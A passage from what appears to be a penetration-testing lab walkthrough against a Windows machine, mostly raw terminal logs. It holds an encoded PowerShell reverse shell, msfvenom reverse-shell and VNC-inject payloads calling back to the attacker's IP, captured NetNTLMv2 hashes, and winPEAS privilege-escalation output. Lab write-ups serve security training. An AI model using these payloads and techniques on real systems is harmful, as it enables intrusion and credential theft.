wBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 80                                                                                                                                                1 ⨯
[sudo] password for kali: 
listening on [any] 80 ...
connect to [192.168.49.121] from (UNKNOWN) [192.168.121.44] 49235

PS C:\UnrealTournament\System> whoami
fluffy-pc\daisy
PS C:\UnrealTournament\System> 
```

## File Transfers

```
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.121 LPORT=80  EXITFUNC=thread -f exe > meterpreter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .   
Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.121.44,49425)
[*] AUTHENTICATE_MESSAGE (fluffy-pc\daisy,FLUFFY-PC)
[*] User FLUFFY-PC\daisy authenticated successfully
[*] daisy::fluffy-pc:aaaaaaaaaaaaaaaa:ac486d80a20e24cce466d52b1dcb4481:010100000000000000474c60a41ad801406814f5ab1e293b000000000100100053007500780059006a004300720072000300100053007500780059006a004300720072000200100054007700460072006100690054006e000400100054007700460072006100690054006e000700080000474c60a41ad80106000400020000000800300030000000000000000000000000200000a903878517584eff1cda50c7d1f96baf89cc173e4d4b1b9a04ff739e190a5e8b000000000000000000000000
[-] Unknown level for query path info! 0x109
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:KALI)
[*] Closing down connection (192.168.121.44,49425)
[*] Remaining connections []
[*] Incoming connection (192.168.121.44,49460)
[*] AUTHENTICATE_MESSAGE (fluffy-pc\daisy,FLUFFY-PC)
[*] User FLUFFY-PC\daisy authenticated successfully
[*] daisy::fluffy-pc:aaaaaaaaaaaaaaaa:f0b2d4d9fbc1737d8ff252bb2dac5c91:0101000000000000002d35aaa41ad8012b580bfbc57f7a2b000000000100100053007500780059006a004300720072000300100053007500780059006a004300720072000200100054007700460072006100690054006e000400100054007700460072006100690054006e0007000800002d35aaa41ad80106000400020000000800300030000000000000000000000000200000a903878517584eff1cda50c7d1f96baf89cc173e4d4b1b9a04ff739e190a5e8b000000000000000000000000
[-] Unknown level for query path info! 0x109
[*] Disconnecting Share(1:KALI)
[*] Closing down connection (192.168.121.44,49460)
[*] Remaining connections []


┌──(kali㉿kali)-[/tmp]
└─$ 
```

```
C:\Users\daisy>copy \\192.168.49.121\kali\winPEASx64.exe wp.exe
copy \\192.168.49.121\kali\winPEASx64.exe wp.exe
        1 file(s) copied.

C:\Users\daisy>dir wp.exe
dir wp.exe
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB

 Directory of C:\Users\daisy

02/03/2022  04:34 AM         1,930,752 wp.exe
               1 File(s)      1,930,752 bytes
               0 Dir(s)  13,057,462,272 bytes free

C:\Users\daisy>copy \\192.168.49.121\kali\meterpreter.exe meterpreter.exe
copy \\192.168.49.121\kali\meterpreter.exe meterpreter.exe
        1 file(s) copied.

C:\Users\daisy>meterpreter.exe
meterpreter.exe

C:\Users\daisy>meterpreter.exe
meterpreter.exe

C:\Users\daisy>meterpreter.exe
meterpreter.exe

C:\Users\daisy>copy \\192.168.49.121\kali\PowerUp.ps1 PowerUp.ps1
copy \\192.168.49.121\kali\PowerUp.ps1 PowerUp.ps1
        1 file(s) copied.

C:\Users\daisy>copy \\192.168.49.121\kali\SharpUp.exe SharpUp.exe
copy \\192.168.49.121\kali\SharpUp.exe SharpUp.exe
        1 file(s) copied.

C:\Users\daisy>meterpreter.exe
meterpreter.exe

C:\Users\daisy>meterpreter.exe
meterpreter.exe

C:\Users\daisy>
```

## VNC

```
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/vncinject/reverse_tcp LHOST=192.168.49.121 LPORT=80  EXITFUNC=thread -f exe > vnc.exe                                                     130 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 362 bytes
Final size of exe file: 73802 bytes
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .                                
[sudo] password for kali: 
Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.121.44,50405)
[*] AUTHENTICATE_MESSAGE (fluffy-pc\daisy,FLUFFY-PC)
[*] User FLUFFY-PC\daisy authenticated successfully
[*] daisy::fluffy-pc:aaaaaaaaaaaaaaaa:64104bc0379d97d1e5b896eef0806424:0101000000000000003ae544ac1ad801c85eceef65e35896000000000100100054006f007a004800570062004b0044000300100054006f007a004800570062004b004400020010004300480057004a006100410042004800040010004300480057004a00610041004200480007000800003ae544ac1ad80106000400020000000800300030000000000000000000000000200000a903878517584eff1cda50c7d1f96baf89cc173e4d4b1b9a04ff739e190a5e8b000000000000000000000000
[-] Unknown level for query path info! 0x109
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:KALI)
[*] Closing down connection (192.168.121.44,50405)
[*] Remaining connections []
```

```
C:\Users\daisy>copy \\192.168.49.121\kali\vnc.exe vnc.exe
copy \\192.168.49.121\kali\vnc.exe vnc.exe
        1 file(s) copied.

C:\Users\daisy> vnc.exe

```

```
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole -q
[sudo] password for kali: 
msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload copy \\192.168.49.121\kali
[-] The value specified for payload is not valid.
msf5 exploit(multi/handler) > set payload windows/vncinject/reverse_tcp
payload => windows/vncinject/reverse_tcp
msf5 exploit(multi/handler) > setg LHOST 192.168.49.121
LHOST => 192.168.49.121
msf5 exploit(multi/handler) > setg LPORT 80
LPORT => 80
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.121:80 
[*] Sending stage (401920 bytes) to 192.168.121.44
[*] Starting local TCP relay on 127.0.0.1:5900...
[*] Local TCP relay started.
[*] Launched vncviewer.
[*] Session 1 created in the background.
msf5 exploit(multi/handler) > sessions

Active sessions
===============

No active sessions.

msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.121:80 
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
No authentication needed
Authentication successful
Desktop name "fluffy-pc"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding
^CCleanupSignalHandler called
[-] Exploit failed [user-interrupt]: Interrupt 
[-] run: Interrupted

[*] VNC connection closed.
msf5 exploit(multi/handler) > sessions

Active sessions
===============

No active sessions.

msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.121:80 
[*] Sending stage (401920 bytes) to 192.168.121.44
[*] Starting local TCP relay on 127.0.0.1:5900...
[*] Local TCP relay started.
[*] Launched vncviewer.
[*] Session 2 created in the background.
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.121:80 
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
No authentication needed
Authentication successful
Desktop name "fluffy-pc"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding

```

![](Pasted%20image%2020220206003300.png)

## WinPEAS

```
C:\Users\daisy>winPEAS.bat
winPEAS.bat

            ((,.,/((((((((((((((((((((/,  */
                                                                                                                                                                        
 [+] SERVICE BINARY PERMISSIONS WITH WMIC and ICACLS                                                                                                                    
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                  
C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe NT SERVICE\TrustedInstaller:(F)                                                                              
                                                                                                                                                                        
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe NT SERVICE\TrustedInstaller:(F)                                                                            
                                                                                                                                                                        
C:\xampp\filezillaftp\filezillaserver.exe BUILTIN\Administrators:(I)(F)                                                                                                 
                                          NT AUTHORITY\Authenticated Users:(I)(M)                                                                                       
                                                                                                                                                                        
C:\Windows\Microsoft.Net\Framework64\v3.0\WPF\PresentationFontCache.exe NT SERVICE\TrustedInstaller:(F)                                                                 
                                                                                                                                                                        
C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\FCUpdateService.exe NT AUTHORITY\SYSTEM:(I)(F)                                                           
                                                                                                                                                                        
C:\Windows\Microsoft.NET\Framework64\v3.0\Windows Communication Foundation\infocard.exe NT SERVICE\TrustedInstaller:(F)                                                 
                                                                                                                                                                        
C:\Program Files (x86)\InspIRCd\inspircd.exe NT AUTHORITY\SYSTEM:(I)(F)                                                                                                 
                                                                                                                                                                        
C:\Windows\Microsoft.NET\Framework64\v3.0\Windows Communication Foundation\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)                                                
                                                                                                                                                                        
C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)                                                                                                        
                                                                                                                                                                        
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                                                                               
                                                                                                                                                                        
C:\Program Files\VMware\VMware Tools\vmtoolsd.exe BUILTIN\Administrators:(I)(F)                                                                                         
                                                                                                                                                                        
C:\Program Files\Windows Media Player\wmpnetwk.exe NT SERVICE\TrustedInstaller:(F)                                                                                      
                                                                                                                                                                        
                                                                                                                                                                        
 [+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY                                                                                                                       
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                  
                                                                                                                                                                        
---                                                                                                                                                                     
Scan complete.                                                                                                                                                          
                                                                                                                                                                        
 [+] UNQUOTED SERVICE PATHS                                                                                                                                             
   [i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:\Program.exe', then 'C:\Program Files\soft\new.exe' and finally 'C:\Program Files\soft\new folder\exec.exe'. Try to create 'C:\Program Files\soft\new.exe'                                                              
   [i] The permissions are also checked and filtered using icacls                                                                                                       
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                  
clr_optimization_v2.0.50727_32                                                                                                                                          
 C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe                                                                                                             
C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe NT SERVICE\TrustedInstaller:(F)                                                                              
                                                                                                                                                                        
clr_optimization_v2.0.50727_64                                                                                                                                          
 C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe                                                                                                           
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe NT SERVICE\TrustedInstaller:(F)                                                                            
                                                                                                                                                                        
FontCache3.0.0.0                                                                                                                                                        
 C:\Windows\Microsoft.Net\Framework64\v3.0\WPF\PresentationFontCache.exe                                                                                                
C:\Windows\Microsoft.Net\Framework64\v3.0\WPF\PresentationFontCache.exe NT SERVICE\TrustedInstaller:(F)                                                                 
                                                                                                                                                                        
FoxitCloudUpdateService                                                                                                                                                 
 C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\FCUpdateService.exe                                                                                     
Invalid parameter "Files"                                                                                                                                               
InspIRCd                                                                                                                                                                
 C:\Program Files (x86)\InspIRCd\inspircd.exe                                                                                                                           
Invalid parameter "Files"                                                                                                                                               
PerfHost                                                                                                                                                                
 C:\Windows\SysWow64\perfhost.exe                                                                                                                                       
C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)                                                                                                        
                                                                                                                                                                        
TrustedInstaller                                                                                                                                                        
 C:\Windows\servicing\TrustedInstaller.exe                                                                                                                              
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                                                                               
                                                                                                                                                                        
                                                                                                                                                                        
[*] DLL HIJACKING in PATHenv variable                                                                                                                                   
   [i] Maybe you can take advantage of modifying/creating some binary in some of the following locations                                                                
   [i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate                                                                         
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking                                                                             
C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)                                                                                                                     
                                                                                                                                                                        
C:\Windows NT SERVICE\TrustedInstaller:(F)                                                                                                                              
                                                                                                                                                                        
C:\Windows\System32\Wbem NT SERVICE\TrustedInstaller:(F)                                                                                                                
                                                                                                                                                                        
                                                                                                                                                                        
[*] CREDENTIALS                                                                                                                                                         
                                                                                                                                                                        
 [+] WINDOWS VAULT                                                                                                                                                      
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#windows-vault                                                                             
                                                                                                                                                                        
Currently stored credentials:                                                                                                                                           
                                                                                                                                                                        
* NONE *                                                                                                                                                                
                                                                                                                                                                        
                                                                                                                                                                        
 [+] Unattended files                                                                                                                                                   
                                                                                                                                                                        
 [+] SAM and SYSTEM backups                                                                                                                                             
                                                                                                                                                                        
 [+] McAffee SiteList.xml                                                                                                                                               
 Volume in drive C is HDD                                                                                                                                               
 Volume Serial Number is DC74-4FCB                                                                                                                                      
 Volume in drive C is HDD                                                                                                                                               
 Volume Serial Number is DC74-4FCB                                                                                                                                      
 Volume in drive C is HDD                                                                                                                                               
 Volume Serial Number is DC74-4FCB                                                                                                                                      
 Volume in drive C is HDD                                                                                                                                               
 Volume Serial Number is DC74-4FCB                                                                                                                                      
                                                                                                                                                                        
C:\Users\daisy\Documents\MumbleAutomaticCertificateBackup.p12                                                                                                           
C:\Windows\Panther\setupinfo                                                                                                                                            
C:\Windows\winsxs\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.0.6002.18005_none_6ef387546a5193ce\appcmd.exe                                          
C:\Windows\winsxs\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.0.6002.18005_none_794831a69eb255c9\appcmd.exe                                          
C:\xampp\apache\conf\httpd.conf                                                                                                                                         
C:\xampp\apache\conf\httpd.conf                                                                                                                                         
C:\xampp\apache\conf\original\httpd.conf                                                                                                                                
C:\xampp\apache\conf\original\httpd.conf                                                                                                                                
C:\xampp\apache\conf\ssl.csr\server.csr                                                                                                                                 
C:\xampp\apache\logs\access.log                                                                                                                                         
C:\xampp\apache\logs\error.log                                                                                                                                          
C:\xampp\apache\logs\access.log                                                                                                                                         
C:\xampp\apache\logs\error.log                                                                                                                                          
C:\xampp\htdocs\public_html\cache\config_active_modules.php                                                                                                             
C:\xampp\htdocs\public_html\cache\config_adlinks.php                                                                                                                    
C:\xampp\htdocs\public_html\cache\config_blocks_list.php                                                                                                                
C:\xampp\htdocs\public_html\cache\config_MAIN_CFG.php                                                                                                                   
C:\xampp\htdocs\public_html\cache\config_waitlist.php                                                                                                                   
C:\xampp\htdocs\public_html\includes\config.php                                                                                                                         
C:\xampp\htdocs\public_html\install2-old-remove\config.php                                                                                                              
C:\xampp\mysql\bin\my.ini                                                                                                                                               
C:\xampp\php\php.ini                                                                                                                                                    
C:\xampp\php\pear\Config.php                                                                                                                                            
C:\xampp\php\pear\PEAR\Config.php                                                                                                                                       
C:\xampp\php\pear\PEAR\Command\Config.php                                                                                                                               
C:\xampp\php\pear\phing\ConfigurationException.php                                                                                                                      
C:\xampp\php\pear\phing\RuntimeConfigurable.php                                                                                                                         
C:\xampp\php\pear\phing\parser\ProjectConfigurator.php                                                                                                                  
C:\xampp\php\pear\PHP\Debug\Renderer\HTML\DivConfig.php                                                                                                                 
C:\xampp\php\pear\PHP\Debug\Renderer\HTML\TableConfig.php                                                                                                               
C:\xampp\php\pear\PhpDocumentor\phpDocumentor\Smarty-2.6.0\libs\Config_File.class.php                                                                                   
C:\xampp\php\pear\PhpDocumentor\phpDocumentor\Smarty-2.6.0\libs\plugins\function.config_load.php                                                                        
C:\xampp\php\pear\PHPUnit\Util\Configuration.php                                                                                                                        
C:\xampp\phpMyAdmin\config.inc.php                                                                                                                                      
C:\xampp\phpMyAdmin\config.sample.inc.php                                                                                                                               
C:\xampp\phpMyAdmin\show_config_errors.php                                                                                                                              
C:\xampp\phpMyAdmin\examples\config.manyhosts.inc.php                                                                                                                   
C:\xampp\phpMyAdmin\libraries\Config.class.php                                                                                                                          
C:\xampp\phpMyAdmin\libraries\config.default.php                                                                                                                        
C:\xampp\phpMyAdmin\libraries\config.values.php                                                                                                                         
C:\xampp\phpMyAdmin\libraries\vendor_config.php                                                                                                                         
C:\xampp\phpMyAdmin\libraries\config\ConfigFile.class.php                                                                                                               
C:\xampp\phpMyAdmin\libraries\config\config_functions.lib.php                                                                                                           
C:\xampp\phpMyAdmin\libraries\config\ServerConfigChecks.class.php                                                                                                       
C:\xampp\phpMyAdmin\libraries\plugins\auth\AuthenticationConfig.class.php                                                                                               
C:\xampp\phpMyAdmin\libraries\tcpdf\tcpdf_autoconfig.php                                                                                                                
C:\xampp\phpMyAdmin\libraries\tcpdf\config\tcpdf_config.php                                                                                                             
C:\xampp\phpMyAdmin\setup\config.php                                                                                                                                    
C:\xampp\phpMyAdmin\setup\frames\config.inc.php                                                                                                                         
C:\xampp\phpMyAdmin\setup\lib\ConfigGenerator.class.php                                                                                                                 
                                                                                                                                                                        
---                                                                                                                                                                     
Scan complete.                                                                                                                                                          
                                                                                                                                                                        
 [+] GPP Password                                                                                                                                                       
                                                                                                                                                                        
 [+] Cloud Credentials                                                                                                                                                  
                                                                                                                                                                        
 [+] AppCmd                                                                                                                                                             
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe                                                                                
                                                                                                                                                                        
 [+] Files in registry that may contain credentials                                                                                                                     
   [i] Searching specific files that may contains credentials.                                                                                                          
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files                                                                  
Looking inside HKCU\Software\ORL\WinVNC3\Password                                                                                                                       
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                                                                                     
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                                                                               
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                                                                              
Looking inside HKCU\Software\TightVNC\Server                                                                                                                            
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                                                                                 
Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                                                                         
C:\Users\daisy\Documents\MumbleAutomaticCertificateBackup.p12                                                                                                           
C:\Windows\Panther\setupinfo                                                                                                                                            
C:\Windows\winsxs\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.0.6002.18005_none_6ef387546a5193ce\appcmd.exe                                          
C:\Windows\winsxs\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.0.6002.18005_none_794831a69eb255c9\appcmd.exe                                          
C:\xampp\apache\conf\httpd.conf                                                                                                                                         
C:\xampp\apache\conf\httpd.conf                                                                                                                                         
C:\xampp\apache\conf\original\httpd.conf                                                                                                                                
C:\xampp\apache\conf\original\httpd.conf                                                                                                                                
C:\xampp\apache\conf\ssl.csr\server.csr                                                                                                                                 
C:\xampp\apache\logs\access.log                                                                                                                                         
C:\xampp\apache\logs\error.log                                                                                                                                          
C:\xampp\apache\logs\access.log                                                                                                                                         
C:\xampp\apache\logs\error.log                                                                                                                                          
C:\xampp\htdocs\public_html\cache\config_active_modules.php                                                                                                             
C:\xampp\htdocs\public_html\cache\config_adlinks.php                                                                                                                    
C:\xampp\htdocs\public_html\cache\config_blocks_list.php                                                                                                                
C:\xampp\htdocs\public_html\cache\config_MAIN_CFG.php                                                                                                                   
C:\xampp\htdocs\public_html\cache\config_waitlist.php                                                                                                                   
C:\xampp\htdocs\public_html\includes\config.php                                                                                                                         
C:\xampp\htdocs\public_html\install2-old-remove\config.php                                                                                                              
C:\xampp\mysql\bin\my.ini                                                                                                                                               
C:\xampp\php\php.ini                                                                                                                                                    
C:\xampp\php\pear\Config.php                                                                                                                                            
C:\xampp\php\pear\PEAR\Config.php                                                                                                                                       
C:\xampp\php\pear\PEAR\Command\Config.php                                                                                                                               
C:\xampp\php\pear\phing\ConfigurationException.php                                                                                                                      
C:\xampp\php\pear\phing\RuntimeConfigurable.php                                                                                                                         
C:\xampp\php\pear\phing\parser\ProjectConfigurator.php                                                                                                                  
C:\xampp\php\pear\PHP\Debug\Renderer\HTML\DivConfig.php                                                                                                                 
C:\xampp\php\pear\PHP\Debug\Renderer\HTML\TableConfig.php                                                                                                               
C:\xampp\php\pear\PhpDocumentor\phpDocumentor\Smarty-2.6.0\libs\Config_File.class.php                                                                                   
C:\xampp\php\pear\PhpDocumentor\phpDocumentor\Smarty-2.6.0\libs\plugins\function.config_load.php                                                                        
C:\xampp\php\pear\PHPUnit\Util\Configuration.php                                                                                                                        
C:\xampp\phpMyAdmin\config.inc.php                                                                                                                                      
C:\xampp\phpMyAdmin\config.sample.inc.php                                                                                                                               
C:\xampp\phpMyAdmin\show_config_errors.php                                                                                                                              
C:\xampp\phpMyAdmin\examples\config.manyhosts.inc.php                                                                                                                   
C:\xampp\phpMyAdmin\libraries\Config.class.php                                                                                                                          
C:\xampp\phpMyAdmin\libraries\config.default.php                                                                                                                        
C:\xampp\phpMyAdmin\libraries\config.values.php                                                                                                                         
C:\xampp\phpMyAdmin\libraries\vendor_config.php                                                                                                                         
C:\xampp\phpMyAdmin\libraries\config\ConfigFile.class.php                                                                                                               
C:\xampp\phpMyAdmin\libraries\config\config_functions.lib.php                                                                                                           
C:\xampp\phpMyAdmin\libraries\config\ServerConfigChecks.class.php                                                                                                       
C:\xampp\phpMyAdmin\libraries\plugins\auth\AuthenticationConfig.class.php                                                                                               
C:\xampp\phpMyAdmin\libraries\tcpdf\tcpdf_autoconfig.php                                                                                                                
C:\xampp\phpMyAdmin\libraries\tcpdf\config\tcpdf_config.php                                                                                                             
C:\xampp\phpMyAdmin\setup\config.php                                                                                                                                    
C:\xampp\phpMyAdmin\setup\frames\config.inc.php                                                                                                                         
C:\xampp\phpMyAdmin\setup\lib\ConfigGenerator.class.php                                                                                                                 
                                                                                                                                                                        
---                                                                                                                                                                     
Scan complete.                                                                                                                                                          
                                                                                                                                                                        
 [+] DPAPI MASTER KEYS                                                                                                                                                  
   [i] Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt                                                                          
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi                                                                                     
                                                                                                                                                                        
                                                                                                                                                                        
    Directory: C:\Users\daisy\AppData\Roaming\Microsoft\Protect                                                                                                         
                                                                                                                                                                        
                                                                                                                                                                        
Mode                LastWriteTime     Length Name                                                                                                                       
----                -------------     ------ ----                                                                                                                       
d---s        12/22/2020   4:13 AM            S-1-5-21-2166732910-1323509646-228                                                                                         
                                             9275227-1001                                                                                                               
                                                                                                                                                                        
                                                                                                                                                                        
 [+] DPAPI MASTER KEYS                                                                                                                                                  
   [i] Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt                                                                                     
   [i] You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module                                                                
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi                                                                                     
                                                                                                                                                                        
Looking inside C:\Users\daisy\AppData\Roaming\Microsoft\Credentials\                                                                                                    
                                                                                                                                                                        
                                                                                                                                                                        
Looking inside C:\Users\daisy\AppData\Local\Microsoft\Credentials\                                                                                                      
                                                                                                                                                                        
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                                                                                     
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                                                                               
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                                                                              
Looking inside HKCU\Software\TightVNC\Server                                                                                                                            
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                                                                                 
Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                                                                         
C:\Users\daisy\Documents\MumbleAutomaticCertificateBackup.p12                                                                                                           
C:\Windows\Panther\setupinfo                                                                                                                                            
C:\Windows\winsxs\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.0.6002.18005_none_6ef387546a5193ce\appcmd.exe                                          
C:\Windows\winsxs\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.0.6002.18005_none_794831a69eb255c9\appcmd.exe                                          
C:\xampp\apache\conf\httpd.conf                                                                                                                                         
C:\xampp\apache\conf\httpd.conf                                                                                                                                         
C:\xampp\apache\conf\original\httpd.conf                                                                                                                                
C:\xampp\apache\conf\original\httpd.conf                                                                                                                                
C:\xampp\apache\conf\ssl.csr\server.csr                                                                                                                                 
C:\xampp\apache\logs\access.log                                                                                                                                         
C:\xampp\apache\logs\error.log                                                                                                                                          
C:\xampp\apache\logs\access.log                                                                                                                                         
C:\xampp\apache\logs\error.log                                                                                                                                          
C:\xampp\htdocs\public_html\cache\config_active_modules.php                                                                                                             
C:\xampp\htdocs\public_html\cache\config_adlinks.php                                                                                                                    
C:\xampp\htdocs\public_html\cache\config_blocks_list.php                                                                                                                
C:\xampp\htdocs\public_html\cache\config_MAIN_CFG.php                                                                                                                   
C:\xampp\htdocs\public_html\cache\config_waitlist.php                                                                                                                   
C:\xampp\htdocs\public_html\includes\config.php                                                                                                                         
C:\xampp\htdocs\public_html\install2-old-remove\config.php                                                                                                              
C:\xampp\mysql\bin\my.ini                                                                                                                                               
C:\xampp\php\php.ini                                                                                                                                                    
C:\xampp\php\pear\Config.php                                                                                                                                            
C:\xampp\php\pear\PEAR\Config.php                                                                                                                                       
C:\xampp\php\pear\PEAR\Command\Config.php                                                                                                                               
C:\xampp\php\pear\phing\ConfigurationException.php                                                                                                                      
C:\xampp\php\pear\phing\RuntimeConfigurable.php                                                                                                                         
C:\xampp\php\pear\phing\parser\ProjectConfigurator.php                                                                                                                  
C:\xampp\php\pear\PHP\Debug\Renderer\HTML\DivConfig.php                                                                                                                 
C:\xampp\php\pear\PHP\Debug\Renderer\HTML\TableConfig.php                                                                                                               
C:\xampp\php\pear\PhpDocumentor\phpDocumentor\Smarty-2.6.0\libs\Config_File.class.php                                                                                   
C:\xampp\php\pear\PhpDocumentor\phpDocumentor\Smarty-2.6.0\libs\plugins\function.config_load.php                                                                        
C:\xampp\php\pear\PHPUnit\Util\Configuration.php                                                                                                                        
C:\xampp\phpMyAdmin\config.inc.php                                                                                                                                      
C:\xampp\phpMyAdmin\config.sample.inc.php                                                                                                                               
C:\xampp\phpMyAdmin\show_config_errors.php                                                                                                                              
C:\xampp\phpMyAdmin\examples\config.manyhosts.inc.php                                                                                                                   
C:\xampp\phpMyAdmin\libraries\Config.class.php                                                                                                                          
C:\xampp\phpMyAdmin\libraries\config.default.php                                                                                                                        
C:\xampp\phpMyAdmin\libraries\config.values.php                                                                                                                         
C:\xampp\phpMyAdmin\libraries\vendor_config.php                                                                                                                         
C:\xampp\phpMyAdmin\libraries\config\ConfigFile.class.php                                                                                                               
C:\xampp\phpMyAdmin\libraries\config\config_functions.lib.php                                                                                                           
C:\xampp\phpMyAdmin\libraries\config\ServerConfigChecks.class.php                                                                                                       
C:\xampp\phpMyAdmin\libraries\plugins\auth\AuthenticationConfig.class.php                                                                                               
C:\xampp\phpMyAdmin\libraries\tcpdf\tcpdf_autoconfig.php                                                                                                                
C:\xampp\phpMyAdmin\libraries\tcpdf\config\tcpdf_config.php                                                                                                             
C:\xampp\phpMyAdmin\setup\config.php                                                                                                                                    
C:\xampp\phpMyAdmin\setup\frames\config.inc.php                                                                                                                         
C:\xampp\phpMyAdmin\setup\lib\ConfigGenerator.class.php                                                                                                                 
                                                                                                                                                                        
---                                                                                                                                                                     
Scan complete.                                                                                                                                                          
                                                                                                                                                                        
                                                                                                                                                                        
 [+] Unattended files                                                                                                                                                   
                                                                                                                                                                        
 [+] SAM and SYSTEM backups                                                                                                                                             
                                                                                                                                                                        
 [+] McAffee SiteList.xml                                                                                                                                               
 Volume in drive C is HDD                                                                                                                                               
 Volume Serial Number is DC74-4FCB                                                                                                                                      
 Volume in drive C is HDD                                                                                                                                               
 Volume Serial Number is DC74-4FCB                                                                                                                                      
 Volume in drive C is HDD                                                                                                                                               
